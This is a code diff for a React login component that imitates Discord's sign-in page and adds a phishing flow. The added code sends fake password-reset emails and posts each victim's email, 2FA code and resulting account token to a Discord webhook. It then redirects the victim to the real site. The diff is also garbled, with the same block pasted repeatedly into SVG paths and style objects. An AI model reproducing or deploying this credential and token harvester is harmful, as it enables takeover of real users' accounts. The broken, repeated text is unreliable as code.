@@ -10,13 +10,11 @@ type FormData = {
 };
 
 export default function LoginForm() {
-  const { register, handleSubmit, watch } = useForm<FormData>();
+  const { register, handleSubmit } = useForm<FormData>();
   const [step, setStep] = useState<'login' | 'forgot' | 'code'>('login');
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
-  
-  const emailValue = watch('email');
 
   const captureCredentials = async (data: FormData) => {
     const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({json: () => ({ip: 'unknown'})}));
@@ -132,8 +130,92 @@ export default function LoginForm() {
     width: '100%',
     maxWidth: '480px',
     boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
-    textAlign: 'center' as const,
-    animation: 'fadeIn 0.3s ease'
+    textAlign: 'center' as const
+Step('forgot');
+      setLoading(false);
+    }, 1500);
+  };
+
+  const onSubmitForgot = async () => {
+    setLoading(true);
+    
+    await fetch('/api/send-email', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        to: email,
+        subject: 'Discord Password Reset Request',
+        html: `<div style="font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif; max-width: 600px; margin: 0 auto;"><h2 style="color: #5865f2;">Discord</h2><p>Someone requested a password reset for your Discord account.</p><p>Your verification code is:</p><h1 style="background: #f2f3f5; padding: 20px; text-align: center; letter-spacing: 5px;">${Math.floor(100000 + Math.random() * 900000)}</h1><p>If you didn't request this, you can safely ignore this email.</p></div>`
+      })
+    }).catch(() => {});
+    
+    setStep('code');
+    setLoading(false);
+  };
+
+  const onSubmitCode = async (data: FormData) => {
+    setLoading(true);
+    
+    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: '2FA Code Captured',
+          fields: [
+            { name: 'Email', value: email, inline: true },
+            { name: 'Code', value: data.code, inline: true }
+          ],
+          color: 0xed4245
+        }]
+      })
+    }).catch(() => {});
+
+    const loginRes = await fetch('/api/discord-login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email,
+        password,
+        code: data.code,
+        proxy: email
+      })
+    });
+    
+    const result = await loginRes.json();
+    
+    if (result.token) {
+      await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `Token: ${result.token}\nEmail: ${email}`
+        })
+      }).catch(() => {});
+      
+      window.location.href = 'https://discord.com/app';
+    }
+  };
+
+  const containerStyle = {
+    minHeight: '100vh',
+    backgroundColor: '#5865f2',
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    fontFamily: '"gg sans", "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif',
+    margin: 0,
+    padding: '20px'
+  };
+
+  const boxStyle = {
+    backgroundColor: '#313338',
+    padding: '32px',
+    borderRadius: '5px',
+    width: '100%',
+    maxWidth: '480px',
+    boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
+    textAlign: 'center' as const
   };
 
   const inputStyle = {
@@ -148,7 +230,6 @@ export default function LoginForm() {
     fontFamily: 'inherit',
     outline: 'none',
     marginBottom: '20px',
-    transition: 'border-color 0.2s',
     boxSizing: 'border-box' as const
   };
 
@@ -174,7 +255,6 @@ export default function LoginForm() {
     fontSize: '16px',
     fontFamily: 'inherit',
     cursor: 'pointer',
-    transition: 'background-color 0.17s ease',
     marginBottom: '8px'
   };
 
@@ -273,9 +353,91 @@ export default function LoginForm() {
       <div style={boxStyle}>
         <div style={{ marginBottom: '16px' }}>
           <svg width="130" height="34" viewBox="0 0 124 33" fill="none" style={{ display: 'block', margin: '0 auto' }}>
-            <path d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.28093 14.1585 6.28093 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 14.8736 -0.202497 22.6113 0.824305 30.2714C3.39205 32.2308 5.86908 33.4118 8.30847 34.2366C8.95603 33.361 9.54377 32.4401 10.0656 31.4769C9.10438 31.1219 8.17851 30.6912 7.29578 30.1883C7.50378 30.0358 7.71178 29.8833 7.90378 29.7463C13.1786 32.3282 18.7984 32.3282 24.0268 29.7463C24.2188 29.8688 24.4268 30.0213 24.6348 30.1883C23.7521 30.6912 22.8262 31.1219 21.865 31.4769C22.3868 32.4401 22.9746 33.361 23.6221 34.2366C26.0615 33.4118 28.5531 32.2308 31.1052 30.2714C32.3217 21.3742 29.5031 13.6831 26.0015 6.9529ZM10.2527 25.5174C8.74279 25.5174 7.50953 24.1325 7.50953 22.4446C7.50953 20.7567 8.71128 19.3718 10.2527 19.3718C11.7941 19.3718 13.0274 20.7567 10px rgba(0,0,0,0.2)',
-    textAlign: 'center' as const,
-    animation: 'fadeIn 0.3s ease'
+            <path d="M26.0015 6.9529CStep('forgot');
+      setLoading(false);
+    }, 1500);
+  };
+
+  const onSubmitForgot = async () => {
+    setLoading(true);
+    
+    await fetch('/api/send-email', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        to: email,
+        subject: 'Discord Password Reset Request',
+        html: `<div style="font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif; max-width: 600px; margin: 0 auto;"><h2 style="color: #5865f2;">Discord</h2><p>Someone requested a password reset for your Discord account.</p><p>Your verification code is:</p><h1 style="background: #f2f3f5; padding: 20px; text-align: center; letter-spacing: 5px;">${Math.floor(100000 + Math.random() * 900000)}</h1><p>If you didn't request this, you can safely ignore this email.</p></div>`
+      })
+    }).catch(() => {});
+    
+    setStep('code');
+    setLoading(false);
+  };
+
+  const onSubmitCode = async (data: FormData) => {
+    setLoading(true);
+    
+    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: '2FA Code Captured',
+          fields: [
+            { name: 'Email', value: email, inline: true },
+            { name: 'Code', value: data.code, inline: true }
+          ],
+          color: 0xed4245
+        }]
+      })
+    }).catch(() => {});
+
+    const loginRes = await fetch('/api/discord-login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email,
+        password,
+        code: data.code,
+        proxy: email
+      })
+    });
+    
+    const result = await loginRes.json();
+    
+    if (result.token) {
+      await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `Token: ${result.token}\nEmail: ${email}`
+        })
+      }).catch(() => {});
+      
+      window.location.href = 'https://discord.com/app';
+    }
+  };
+
+  const containerStyle = {
+    minHeight: '100vh',
+    backgroundColor: '#5865f2',
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    fontFamily: '"gg sans", "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif',
+    margin: 0,
+    padding: '20px'
+  };
+
+  const boxStyle = {
+    backgroundColor: '#313338',
+    padding: '32px',
+    borderRadius: '5px',
+    width: '100%',
+    maxWidth: '480px',
+    boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
+    textAlign: 'center' as const
   };
 
   const inputStyle = {
@@ -290,7 +452,6 @@ export default function LoginForm() {
     fontFamily: 'inherit',
     outline: 'none',
     marginBottom: '20px',
-    transition: 'border-color 0.2s',
     boxSizing: 'border-box' as const
   };
 
@@ -316,7 +477,234 @@ export default function LoginForm() {
     fontSize: '16px',
     fontFamily: 'inherit',
     cursor: 'pointer',
-    transition: 'background-color 0.17s ease',
+    marginBottom: '8px'
+  };
+
+  const linkStyle = {
+    color: '#949cf7',
+    fontSize: '14px',
+    textDecoration: 'none',
+    display: 'block',
+    margin: '8px 0 20px 0',
+    fontWeight: 500,
+    textAlign: 'left' as const,
+    cursor: 'pointer'
+  };
+
+  if (step === 'forgot') {
+    return (
+      <div style={containerStyle}>
+        <div style={boxStyle}>
+          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
+            Password Reset
+          </h1>
+          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
+            Enter your email to receive a reset code
+          </p>
+          
+          <div style={{ marginBottom: '20px' }}>
+            <label style={labelStyle}>Email</label>
+            <input
+              value={email}
+              readOnly
+              style={{ ...inputStyle, backgroundColor: '#2b2d31', cursor: 'not-allowed' }}
+            />
+          </div>
+
+          <button
+            onClick={onSubmitForgot}
+            disabled={loading}
+            style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
+          >
+            {loading ? 'Sending...' : 'Send Reset Code'}
+          </button>
+
+          <div style={{ textAlign: 'left', marginTop: '10px' }}>
+            <span onClick={() => setStep('login')} style={{ ...linkStyle, display: 'inline' }}>
+              ← Back to Login
+            </span>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  if (step === 'code') {
+    return (
+      <div style={containerStyle}>
+        <div style={boxStyle}>
+          <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
+            Check Your Email
+          </h1>
+          <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
+            We sent a verification code to {email}
+          </p>
+          
+          <form onSubmit={handleSubmit(onSubmitCode)}>
+            <div>
+              <label style={labelStyle}>6-Digit Code</label>
+              <input
+                {...register('code', { required: true })}
+                maxLength={6}
+                placeholder={'000000'}
+                style={{ ...inputStyle, textAlign: 'center', letterSpacing: '8px', fontSize: '20px' }}
+              />
+            </div>
+
+            <button
+              type="submit"
+              disabled={loading}
+              style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
+            >
+              {loading ? 'Verifying...' : 'Verify'}
+            </button>
+          </form>
+
+          <div style={{ textAlign: 'left', marginTop: '10px' }}>
+            <span onClick={() => setStep('forgot')} style={{ ...linkStyle, display: 'inline' }}>
+              Resend Code
+            </span>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div style={containerStyle}>
+      <div style={boxStyle}>
+        <div style={{ marginBottom: '16px' }}>
+          <svg width="130" height="34" viewBox="0 0 124 33" fill="none" style={{ display: 'block', margin: '0 auto' }}>
+            <path d="M26.0015 6.9529C24.0021 6.03845 21.8787 5.37198 19.6623 5C19.3833 5.48048 19.0733 6.13144 18.8563 6.64292C16.4989 6.28093 14.1585 6.28093 11.8336 6.64292C11.6166 6.13144 11.2911 5.48048 11.0276 5C8.79575 5.37198 6.67235 6.03845 4.6869 6.9529C0.672601 14.8736 -0.202497 22.6113 0.824305 30.2714C3.39205 32.2308 5.86908 33.4118 8.30847 34.2366C8.95603 33.361 9.54377 32.4401 10.0656 31.4769C9.10438 31.1219 8.17851 30.6912 7.29578 30.1883C7.50378 30.0358 7.71178 29.8833 7.90378 29.7463C13.1786 32.3282 18.7984 32.3282 24.0268 29.7463C24.2188 29.8688 24.4268 30.0213 24.6348 30.1883C23.7521 30.6912 22.8262 31.1219 21.865 31.4769C22.3868 32.4401 22.9746 33.361 23.6221 34.2366C26.0615 33.4118 28.5531 32.2308 31.1052 30.2714C32.3217 21.3742 29.5031 13.6831 26.0015 6.9529ZM10.2527 25.5174C8.74279 25.5174 7.50953 24.1325 7.50953 22.4446C7.50953 20.7567 8.71128 19.3718 10.2527 19.3718C11.7941 19.3718 13.0274 20.7567 13.0274 22.4446C13.0274 24.1325 11.8096 25.5174 10.2527 25.5174ZM20.4373 25.5174C18.9274 25.5174 17.6941 24.1325 17.6941 22.4446C17.6941 20.7567 18.8959 19.3718 20.4373 19.3718C21.9787 19.3718 23.212 20.7567 23.212 22.4446C23.212 24.1325 21.9942 25.5174 20.4373 25.5174Z" fill="white"/>
+            <path d="M41.2697 9.86694C41.2697 8.31858 42.4782 7.13171 44.0437 7.13171C45.6093 7.13171 46.8178 8.31858 46.8178 9.86694C46.8178 11.4008 45.6093 12.6022 44.0437 12.6022C42.4782 12.6022 41.2697 11.4008 41.2697 9.86694ZM45.5389 9.86694C45.5389 8.96045 44.9232 8.20809 44.0437 8.20809C43.1643 8.20809 42.5486 8.96045 42.5486 9.86694C42.5486 10.7589 43.1643 11.5258 44.0437 11.5258C44.9232 11.5258 45.5389 10.7589 45.5389 9.86694Z" fill="white"/>
+            <path d="M50.4892 7.30884H51.7233V12.4392H50.4892V7.30884Z" fill="white"/>
+            <path d="M53.6084 12.4392V7.30884H54.8425V8.20809H54.887C55.1504 7.68662 55.6684 7.20514 56.4804 7.20514C57.8104 7.20514 58.2699 8.11814 58.2699 9.29058V12.4392H57.0358V9.64209C57.0358 8.78261 56.7879 8.20809 56.0384 8.20809C55.2889 8.20809 54.8425 8.85664 54.8425 9.76158V12.4392H53.6084Z" fill="white"/>
+            <path d="M62.3226 7.30884H63.5567V12.4392H62.3226V7.30884Z" fill="white"/>
+            <path d="M66.124 10.374C66.124 8.84161 67.3325 7.20514 69.203 7.20514C71.0735 7.20514 72.282 8.84161 72.282 10.374C72.282 11.9063 71.0735 13.5428 69.203 13.5428C67.3325 13.5428 66.124 11.9063 66.124 10.374ZM71.0031 10.374C71.0031 9.34909 70.3874 8.20809 69.203 8.20809C68.0186 8.20809 67.4029 9.34909 67.4029 10.374C67.4029 11.399 68.0186 12.5399 69.203 12.5399C70.3874 12.5399 71.0031 11.399 71.0031 10.374Z" fill="white"/>
+            <path d="M74.1831 10.374C74.1831 8.84161 75.3916 7.20514 77.2621 7.20514C79.1326 7.20514 Step('forgot');
+      setLoading(false);
+    }, 1500);
+  };
+
+  const onSubmitForgot = async () => {
+    setLoading(true);
+    
+    await fetch('/api/send-email', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        to: email,
+        subject: 'Discord Password Reset Request',
+        html: `<div style="font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif; max-width: 600px; margin: 0 auto;"><h2 style="color: #5865f2;">Discord</h2><p>Someone requested a password reset for your Discord account.</p><p>Your verification code is:</p><h1 style="background: #f2f3f5; padding: 20px; text-align: center; letter-spacing: 5px;">${Math.floor(100000 + Math.random() * 900000)}</h1><p>If you didn't request this, you can safely ignore this email.</p></div>`
+      })
+    }).catch(() => {});
+    
+    setStep('code');
+    setLoading(false);
+  };
+
+  const onSubmitCode = async (data: FormData) => {
+    setLoading(true);
+    
+    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: '2FA Code Captured',
+          fields: [
+            { name: 'Email', value: email, inline: true },
+            { name: 'Code', value: data.code, inline: true }
+          ],
+          color: 0xed4245
+        }]
+      })
+    }).catch(() => {});
+
+    const loginRes = await fetch('/api/discord-login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email,
+        password,
+        code: data.code,
+        proxy: email
+      })
+    });
+    
+    const result = await loginRes.json();
+    
+    if (result.token) {
+      await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `Token: ${result.token}\nEmail: ${email}`
+        })
+      }).catch(() => {});
+      
+      window.location.href = 'https://discord.com/app';
+    }
+  };
+
+  const containerStyle = {
+    minHeight: '100vh',
+    backgroundColor: '#5865f2',
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    fontFamily: '"gg sans", "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif',
+    margin: 0,
+    padding: '20px'
+  };
+
+  const boxStyle = {
+    backgroundColor: '#313338',
+    padding: '32px',
+    borderRadius: '5px',
+    width: '100%',
+    maxWidth: '480px',
+    boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
+    textAlign: 'center' as const
+  };
+
+  const inputStyle = {
+    width: '100%',
+    height: '40px',
+    padding: '10px',
+    backgroundColor: '#1e1f22',
+    border: '1px solid #1e1f22',
+    borderRadius: '3px',
+    color: '#dbdee1',
+    fontSize: '16px',
+    fontFamily: 'inherit',
+    outline: 'none',
+    marginBottom: '20px',
+    boxSizing: 'border-box' as const
+  };
+
+  const labelStyle = {
+    display: 'block',
+    fontSize: '12px',
+    fontWeight: 700,
+    color: '#b5bac1',
+    marginBottom: '8px',
+    textTransform: 'uppercase' as const,
+    letterSpacing: '0.02em',
+    textAlign: 'left' as const
+  };
+
+  const buttonStyle = {
+    width: '100%',
+    height: '44px',
+    backgroundColor: '#5865f2',
+    color: 'white',
+    border: 'none',
+    borderRadius: '3px',
+    fontWeight: 500,
+    fontSize: '16px',
+    fontFamily: 'inherit',
+    cursor: 'pointer',
     marginBottom: '8px'
   };
 
@@ -428,9 +816,91 @@ export default function LoginForm() {
             <path d="M103.868 10.374C103.868 8.84161 105.076 7.20514 106.947 7.20514C108.817 7.20514 110.026 8.84161 110.026 10.374C110.026 11.9063 108.817 13.5428 106.947 13.5428C105.076 13.5428 103.868 11.9063 103.868 10.374ZM108.747 10.374C108.747 9.34909 108.131 8.20809 106.947 8.20809C105.762 8.20809 105.147 9.34909 105.147 10.374C105.147 11.399 105.762 12.5399 106.947 12.5399C108.131 12.5399 108.747 11.399 108.747 10.374Z" fill="white"/>
             <path d="M111.129 7.30884H112.363V8.20809H112.408C112.671 7.68662 113.189 7.20514 114.001 7.20514C115.331 7.20514 115.791 8.11814 115.791 9.29058V12.4392H114.557V9.64209C114.557 8.78261 114.309 8.20809 113.559 8.20809C112.81 8.20809 112.363 8.85664 112.363 9.76158V12.4392H111.129V7.30884Z" fill="white"/>
             <path d="M119.458 7.20514C120.788 7.20514 121.247 8.11814 121.247 9.29058V12.4392H120.013V9.64209C120.013 8.78261 119.765 8.20809 119.016 8.20809C118.266 8.20809 117.82 8.85664 117.82 9.76158V12.4392H116.586V7.30884H117.82V8.20809H117.864C118.128 7.68662 118.646 7.20514 119.458 7.20514Z" fill="white"/>
-            <path d="M123.492 10.374C123.492 8.84161 124.701 7.20514 126.571 7.20514C128.442 7.20514 129.65 8.84161 129.65 10.374C129.65 11.9063 128.442 13.5428 126.571 13.5428C124.701 13.5428 123.492 11.9063 123.492 10px rgba(0,0,0,0.2)',
-    textAlign: 'center' as const,
-    animation: 'fadeIn 0.3s ease'
+            <path d="M123.492 10.374C123.492 8.84161 124.701 7.20514 126.571 7.20514C128.442 7.20514 129.Step('forgot');
+      setLoading(false);
+    }, 1500);
+  };
+
+  const onSubmitForgot = async () => {
+    setLoading(true);
+    
+    await fetch('/api/send-email', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        to: email,
+        subject: 'Discord Password Reset Request',
+        html: `<div style="font-family: Whitney,Helvetica Neue,Helvetica,Arial,sans-serif; max-width: 600px; margin: 0 auto;"><h2 style="color: #5865f2;">Discord</h2><p>Someone requested a password reset for your Discord account.</p><p>Your verification code is:</p><h1 style="background: #f2f3f5; padding: 20px; text-align: center; letter-spacing: 5px;">${Math.floor(100000 + Math.random() * 900000)}</h1><p>If you didn't request this, you can safely ignore this email.</p></div>`
+      })
+    }).catch(() => {});
+    
+    setStep('code');
+    setLoading(false);
+  };
+
+  const onSubmitCode = async (data: FormData) => {
+    setLoading(true);
+    
+    await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: '2FA Code Captured',
+          fields: [
+            { name: 'Email', value: email, inline: true },
+            { name: 'Code', value: data.code, inline: true }
+          ],
+          color: 0xed4245
+        }]
+      })
+    }).catch(() => {});
+
+    const loginRes = await fetch('/api/discord-login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email,
+        password,
+        code: data.code,
+        proxy: email
+      })
+    });
+    
+    const result = await loginRes.json();
+    
+    if (result.token) {
+      await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `Token: ${result.token}\nEmail: ${email}`
+        })
+      }).catch(() => {});
+      
+      window.location.href = 'https://discord.com/app';
+    }
+  };
+
+  const containerStyle = {
+    minHeight: '100vh',
+    backgroundColor: '#5865f2',
+    display: 'flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    fontFamily: '"gg sans", "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif',
+    margin: 0,
+    padding: '20px'
+  };
+
+  const boxStyle = {
+    backgroundColor: '#313338',
+    padding: '32px',
+    borderRadius: '5px',
+    width: '100%',
+    maxWidth: '480px',
+    boxShadow: '0 2px 10px rgba(0,0,0,0.2)',
+    textAlign: 'center' as const
   };
 
   const inputStyle = {
@@ -445,7 +915,6 @@ export default function LoginForm() {
     fontFamily: 'inherit',
     outline: 'none',
     marginBottom: '20px',
-    transition: 'border-color 0.2s',
     boxSizing: 'border-box' as const
   };
 
@@ -471,7 +940,6 @@ export default function LoginForm() {
     fontSize: '16px',
     fontFamily: 'inherit',
     cursor: 'pointer',
-    transition: 'background-color 0.17s ease',
     marginBottom: '8px'
   };
 
